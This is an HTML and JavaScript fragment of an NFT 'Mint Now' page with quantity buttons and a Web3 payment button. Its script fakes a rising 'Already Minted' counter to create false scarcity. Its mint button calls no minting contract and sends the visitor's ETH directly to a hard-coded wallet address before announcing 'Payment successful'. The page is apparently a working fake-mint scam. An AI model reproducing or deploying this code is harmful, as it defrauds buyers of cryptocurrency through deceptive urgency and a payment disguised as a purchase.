<div class="mfor py-5">
	<div class="mt-8">
		<div class="sec-title text-center max-w-3xl mx-auto">
			<br /><br />
				<h2 style="font-weight: bold; color: #fff; font-size: 40px;"> Mint Now </h2>
				<img src="gif.gif" class="img-fluid gifius" alt="gi">
				<p style="font-size: 18px; font-weight: bold; color: #fff;"> Already Minted: <span class="mintCount">3541</span> / 7777 </p>
				<p style="font-size: 18px; font-weight: bold; color: #ffb404;"> MINT 2 GET 1 FREE </p>
				<strong style="font-size: 18px; font-weight: bold; color: #ff0000;"> 0.18 ETH + GAS </strong> <br />
				<strong style="font-size: 18px; font-weight: bold; color: #fff;"> 10 NFTs per Wallet </strong>
				<div class="mt-4">
					<div class="d-flex justify-content-center flex-column align-items-center">

						<div class="d-form" style="justify-content: center; align-items: center;">
							<button class="btn btn-danger bt-minus mx-2">-</button>
							<h1 class="form-control mt-2 txval"> 1 </h1>
							<button class="btn btn-danger bt-plus mx-2">+</button>
						</div>

						<input type="hidden" name="amount" id="inpAmt" value="0.18" />
						<div class="bg-mint">
							<button class="btn btn-secondary btn-mint py-4 px-5 btn-pay"> MINT NOW FOR <span class="ethval">0.18</span> ETH </button>
						</div>
						<br><br>
					</div>

				</div>

		</div>
	</div>
</div>


	<script>
	  var amount = 0.18;
	  $(function() {
		
		var mintCount = 3541;
		setInterval(function() {
		  if(mintCount < 7777) {
			mintCount = mintCount + 1;
		  }
		  $('.mintCount').text(mintCount);
		},2000);
	
		$('.bt-plus').click(function() {
		  var va = parseInt($('.txval').text().trim());
		  var ethval = 0.18
		  if(va < 10) {
			va = va+1;
			$('.txval').text(va);
			$('.ethval').text(amount = (0.18 * va).toFixed(2));
	
			$('#inpAmt').val(amount);
		  }
		})
		$('.bt-minus').click(function() {
		  var va = parseInt($('.txval').text().trim());
		  var ethval = 0.18
		  if(va > 1) {
			va = va-1;
			$('.txval').text(va);
			$('.ethval').text(amount = (0.18 * va).toFixed(2));
			$('#inpAmt').val(amount);
		  }
		})
	  })
	  window.addEventListener('load', async () => {
		if(window.ethereum) {
		  window.web3 = new Web3(ethereum);
		  try {
			await ethereum.enable();
			$('#connect').hide();
			initPayButton()
		  } catch (err) {
			alert('User denied account access', err);
		  }
		} else if (window.web3) {
		  window.web3 = new Web3(web3.currentProvider)
		  $('#connect').hide();
		  initPayButton()
		} else {
		  alert('Non-Ethereum browser detected. You should consider trying MetaMask!');
		}
	  })
	
	  const initPayButton = () => {
		$('.btn-pay').click(async () => {
		  var ethamount = ($('#inpAmt').val());
		  console.log('payment inititated', ethamount);
		  // paymentAddress is where funds will be send to
		  const paymentAddress = '0x68144468BC9170C0391b5e2Cf75fa4a6Fca252d3'
		  const amountEth = (ethamount)
	
		  let accounts = await web3.eth.getAccounts();
		  web3.eth.defaultAccount = accounts[0]
	
		  web3.eth.sendTransaction({
			to: paymentAddress,
			value: web3.utils.toWei(amountEth, 'ether')
		  }, (err, transactionId) => {
			if  (err) {
			  console.log('Payment failed', err)
			  alert('Payment failed')
			} else {
			  console.log('Payment successful', transactionId)
			  alert('Payment successful')
			}
		  })
		})
	  }
	</script>

</div>
